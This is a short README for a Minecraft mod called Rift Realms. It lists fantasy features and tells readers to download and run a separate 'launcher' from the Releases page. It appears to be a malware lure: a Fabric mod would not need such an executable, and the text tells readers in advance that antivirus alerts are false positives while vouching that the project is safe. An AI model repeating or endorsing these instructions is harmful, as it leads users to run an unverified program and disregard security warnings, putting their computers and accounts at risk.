To install Rift Realms, go to the **Releases** section, download the **launcher**, and run it to set everything up automatically. The launcher handles all the files for you, making it easy to start exploring the new dimensions right away.

🌌 Multiple Dimensions – Travel through portals to floating islands, crystal caves, and corrupted void realms.

⚔️ Custom Bosses – Fight ancient guardians like the Rift Serpent, Shadow Monarch, and the Starforged Titan.

🧙 Magic System – Learn spells from runestones, channel mana through relics, and craft your own spellbooks.

🪓 New Weapons and Tools – Forge gear using Riftsteel, Lumic Ore, and Star Dust for special effects.

🌿 Living Biomes – Each dimension reacts to your actions; chop too many trees and spirits might appear.

🏰 Dungeons and Shrines – Randomly generated structures full of puzzles, traps, and hidden lore pieces.

🐉 Tameable Mythical Creatures – Ride wyverns, shadow wolves, and crystal beetles.

⚙️ Rift Tech – Mix magic and machinery to power teleporters, storage cores, and elemental reactors.

📖 Lore System – Collect ancient pages that reveal the story of the fractured realms.

🌠 Dynamic Events – Meteor showers, realm storms, and portal breaches that change the world around you.


Sometimes antivirus programs might flag it as a virus, but this is a **false positive** caused by how the launcher loads assets and runs background processes. Rift Realms is completely safe, **open source**, and **free to play**, so anyone can check the code themselves to confirm it’s clean and trustworthy.

!!! THIS NEEDS FABRIC TO RUN !!!
